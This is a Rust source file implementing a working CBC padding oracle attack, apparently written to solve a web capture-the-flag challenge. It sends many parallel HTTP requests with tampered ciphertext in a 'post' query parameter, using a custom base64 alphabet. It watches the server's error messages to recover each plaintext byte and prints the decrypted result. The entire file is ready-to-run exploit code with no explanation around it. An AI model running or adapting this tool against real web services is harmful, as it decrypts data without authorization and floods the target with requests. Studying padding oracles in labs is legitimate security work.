use std::{
    io::{self, Write},
    process::Output,
    sync::Mutex,
    thread::JoinHandle,
};

use anyhow::Result;
use base64::{prelude::BASE64_STANDARD, Engine};
use indicatif::{ProgressBar, ProgressStyle};
use rayon::prelude::*;
use reqwest::{blocking::Client, Url};

static CHUNK_SIZE: usize = 16;

trait ModBase64 {
    type Output;
    fn fix_base64(self) -> Self::Output;
    fn fuckup_base64(self) -> Self::Output;
}

pub fn decrypt(url: String, ciphertext: &str) -> Result<()> {
    let client = Client::new();
    let ciphertext = BASE64_STANDARD.decode(ciphertext.fix_base64())?;
    rayon::ThreadPoolBuilder::new()
        .num_threads(16)
        .build()
        .unwrap()
        .install(|| {
            let bar = ProgressBar::new((ciphertext.len() * 256 / 2) as u64);
            bar.set_style(
                ProgressStyle::with_template("{wide_bar} {pos}/{len} {per_sec} {eta_precise}")
                    .unwrap(),
            );
            let mut plaintext: Vec<Vec<u8>> = ciphertext
                .par_windows(CHUNK_SIZE * 2)
                .enumerate()
                .rev()
                .step_by(CHUNK_SIZE)
                .map(|(n, chunks)| {
                    let mut cipherblock = [0u8; 16];
                    let mut intermediate = [0u8; 16];
                    for byte in 1..=CHUNK_SIZE {
                        if let Some(value) = (0u8..=255).into_par_iter().find_any(|&value| {
                            let mut cipherblock: [u8; 16] = cipherblock;
                            cipherblock[16 - byte] = value;
                            let encoded = BASE64_STANDARD
                                .encode(
                                    [&cipherblock, &chunks[CHUNK_SIZE..CHUNK_SIZE * 2]].concat(),
                                )
                                .fuckup_base64();
                            let res = client.get(&url).query(&[("post", encoded)]).send().unwrap();
                            let text = res.text().unwrap();

                            // println!("{} {byte} {cipherblock:x?}", n / CHUNK_SIZE);
                            bar.inc(1);
                            if !text.contains("PaddingException") {
                                bar.println(format!("{text}"));
                                if text.contains("UnicodeDecodeError")
                                    || text.contains("ValueError")
                                    || byte != 1
                                {
                                    return true;
                                }
                            }
                            false
                        }) {
                            intermediate[16 - byte] = value ^ byte as u8;
                            cipherblock[16 - byte] = value;
                            for x in 1..=byte {
                                cipherblock[16 - x] = intermediate[16 - x] ^ (byte as u8 + 1);
                            }
                        }
                    }
                    let newplaintext: Vec<u8> = intermediate
                        .iter()
                        .zip(&chunks[0..CHUNK_SIZE])
                        .map(|(&x1, &x2)| x1 ^ x2)
                        .collect();
                    newplaintext
                })
                .collect();
            plaintext.reverse();
            println!(
                "{}",
                String::from_utf8(plaintext.concat()).unwrap().trim_end()
            );
        });

    Ok(())
}

fn test_byte(client: &Client) {}

impl ModBase64 for &str {
    type Output = String;
    fn fix_base64(self) -> Self::Output {
        self.replace('~', "=").replace('!', "/").replace('-', "+")
    }

    fn fuckup_base64(self) -> Self::Output {
        self.replace('=', "~").replace('/', "!").replace('+', "-")
    }
}
